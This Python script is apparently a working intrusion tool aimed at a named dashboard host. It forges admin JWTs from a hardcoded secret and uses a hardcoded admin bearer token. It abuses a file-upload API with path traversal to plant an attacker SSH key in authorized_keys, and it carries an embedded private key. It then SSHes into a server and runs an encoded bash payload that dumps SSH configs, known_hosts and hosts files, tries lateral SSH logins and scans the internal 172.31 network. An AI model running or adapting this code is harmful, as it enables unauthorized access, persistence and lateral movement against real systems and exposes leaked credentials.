#!/usr/bin/env python3
# i29455 Round A: internal 172.31/16 pivot recon from lumii3 (coder@18.142.48.45, sudo root).
import os, sys, json, base64, hmac, hashlib, subprocess, random, urllib.parse as up, time

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AGENT = "agent-047f1d22"; AUID = "fc7c3730-4219-11f1-ac43-525400595be1"; ACUST = "aro"; AIP = "18.142.48.45"
UF = "/home/lumii/.lumii-agent-keeper/../.ssh"; UPATH = UF + "/authorized_keys"
PRIV = base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0egpjMmd0WldReU5UVXhPUUFBQUNCMUpBekRmQkpuYjFMa3QrY29BNDUvTCsrSzNsV2h6NTNGU1dkaEVXdGE0UUFBCkFJaFNkVlBOVW5WVHpRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQjFKQXpEZkJKbmIxTGt0K2NvQTQ1L0wrK0sKM2xXaHo1M0ZTV2RoRVd0YTRRQUFBRURpcDRnNFQ2Tmprc0VYRG9nK1l0UGlFaDdFR1ZRUXJmQXdaZjBYUGtiWQpTblVrRE1OOEVtZHZVdVMzNXlnRGpuOHY3NHJlVmFIUG5jVkpaMkVSYTFyaEFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")
PUB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUkDMN8EmdvUuS35ygDjn8v74reVaHPncVJZ2ERa1rh"

IPS = "172.31.0.248 172.31.16.28 172.31.17.158 172.31.17.162 172.31.18.3 172.31.18.178 172.31.19.141 172.31.20.106 172.31.20.166 172.31.21.110 172.31.21.175 172.31.22.209 172.31.23.49 172.31.23.130 172.31.25.220 172.31.25.244 172.31.26.36 172.31.26.221 172.31.27.51"

SCRIPT = r'''#!/bin/bash
exec 2>&1
export LC_ALL=C
echo "=== ID ==="; id; hostname; echo "--sudo--"; sudo -n id 2>&1 | head -2
echo "=== UNAME ==="; uname -a
echo "=== HOSTS ==="; cat /etc/hosts
echo "=== HOME_LS ==="; ls -la /home
echo "=== SSH_LS ==="; ls -la /home/coder/.ssh 2>/dev/null; ls -la /home/lumii/.ssh 2>/dev/null
echo "=== SSHCONF ==="; cat /home/coder/.ssh/config 2>/dev/null; cat /home/lumii/.ssh/config 2>/dev/null
echo "=== KNOWN ==="; cut -d" " -f1 /home/coder/.ssh/known_hosts 2>/dev/null | sort -u | head -60
echo "=== TOOLS ==="; for t in nmap nc ncat socat fping python3 timeout; do printf "%s=" $t; command -v $t || echo none; done
echo "=== NEIGH ==="; ip neigh
echo "=== DOCKER ==="; sudo docker ps --format "{{.Names}} | {{.Image}} | {{.Ports}}" 2>/dev/null | head -30
echo "=== SSHLOCALTRY ==="
K=/home/coder/.ssh/id_ed25519
[ -f "$K" ] || K=/home/lumii/.ssh/id_ed25519
for ip in __IPS__; do
  for u in coder ubuntu lumii; do
    R=$(timeout 5 ssh -i "$K" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 "$u@$ip" "id;hostname" 2>/dev/null)
    if [ -n "$R" ]; then echo "HIT $u@$ip :: $R"; fi
  done
done
echo "=== SCAN ==="
if command -v nmap >/dev/null 2>&1; then
  echo "-- nmap /20 --"
  timeout 400 nmap -n -Pn -T4 --min-rate 1500 --max-retries 1 --host-timeout 8s -p22,80,443,3000,3306,5432,6379,2375,9000,8080 --open 172.31.16.0/20 -oG - 2>/dev/null | grep -E "Ports:"
  echo "-- nmap .0/24 --"
  timeout 120 nmap -n -Pn -T4 --min-rate 1500 --max-retries 1 --host-timeout 8s -p22,3000,3306,5432,6379,9000,80,443,8080 --open 172.31.0.0/24 -oG - 2>/dev/null | grep -E "Ports:"
else
  echo NO_NMAP
  scan(){ (timeout 2 bash -c "echo >/dev/tcp/$1/$2") 2>/dev/null && echo "OPEN $1:$2"; }
  export -f scan
  for ip in $(seq -f "172.31.%g" 16 31 | while read s; do for h in $(seq 1 254); do echo "$s.$h"; done; done); do
    for p in 22 3000 3306 5432 6379 9000; do scan $ip $p & done
    wait
  done
fi
echo "=== END ==="
'''

WORK = "/tmp/p29455"; os.makedirs(WORK, exist_ok=True)
KP = os.path.join(WORK, "k29455"); open(KP, "wb").write(PRIV); os.chmod(KP, 0o600)

def b64(s):
    if isinstance(s, bytes): s = s.decode("utf-8", "replace")
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, b64(s)), flush=True)

def sh(a, timeout=120, inp=None):
    try:
        r = subprocess.run(a, input=inp, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=40): return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 20)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + pl).encode(), hashlib.sha256).digest())

def call(path, method="GET", body=None, tok=None, bearer=None, maxlen=8000, timeout=30):
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if tok: args += ["-H", "Cookie: session=" + tok]
    if bearer: args += ["-H", "Authorization: Bearer " + bearer]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += ["https://%s%s" % (HOST, path)]
    rc, out, err = curl(args, timeout=timeout)
    i = out.rfind("__CODE__")
    code = out[i+8:].strip()[:3] if i >= 0 else ""
    body = out[:i] if i >= 0 else out
    return {"code": code, "body": body[:maxlen], "len": len(body)}

def files_read(path, tok, maxlen=6000):
    return call("/api/agents/%s/files?action=read&path=%s" % (AGENT, up.quote(path, safe="/")), tok=tok, maxlen=maxlen)

def upload(tok, path, name, content):
    tmp = "/tmp/u_%d" % random.randint(1000, 999999)
    open(tmp, "wb").write(content.encode() if isinstance(content, str) else content)
    args = ["--http2", "-A", UA, "-H", "Authorization: Bearer " + tok, "-w", "\n__CODE__%{http_code}",
            "-F", "files=@%s;filename=%s" % (tmp, name),
            "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AGENT, up.quote(path, safe="/"))]
    rc, out, err = curl(args)
    try: os.unlink(tmp)
    except Exception: pass
    i = out.rfind("__CODE__")
    return {"code": out[i+8:].strip()[:3] if i >= 0 else "", "body": (out[:i] if i >= 0 else out)[:600]}

def main():
    tok = forge({"userId": AUID, "email": "brian@x", "customer": ACUST, "role": "admin"})
    R("me", call("/api/me", tok=tok, maxlen=1500))
    R("agents", call("/api/admin/agents", bearer=ADMIN_TOKEN, maxlen=900000, timeout=60))
    R("conn", call("/api/internal/connected-agents", bearer=ADMIN_TOKEN, maxlen=50000))
    cur = files_read(UPATH, tok)
    orig = ""
    try: orig = json.loads(cur["body"]).get("content", "") or ""
    except Exception: pass
    R("before", {"code": cur["code"], "len": len(orig), "head": orig[:120]})
    if PUB in orig:
        R("upload", "ALREADY_PRESENT")
    else:
        content = (orig.rstrip("\n") + "\n" if orig.strip() else "") + PUB + "\n"
        R("upload", upload(tok, UF, "authorized_keys", content))
    R("after", files_read(UPATH, tok, 400))
    sshbase = ["ssh", "-i", KP, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
               "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=18"]
    script = SCRIPT.replace("__IPS__", IPS)
    rc, out, err = sh(sshbase + ["coder@" + AIP, "echo " + base64.b64encode(script.encode()).decode() + " | base64 -d | bash"], timeout=590)
    R("RA_rc", rc)
    for i in range(0, len(out), 9000):
        R("RA_%02d" % (i // 9000), out[i:i+9000])
    R("RA_err", err[-2000:])
    if orig.strip() and PUB not in orig:
        R("restore", upload(tok, UF, "authorized_keys", orig))
    elif not orig.strip():
        R("restore", "SKIP_EMPTY_ORIG")

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-3000:])
finally:
    sys.exit(1)
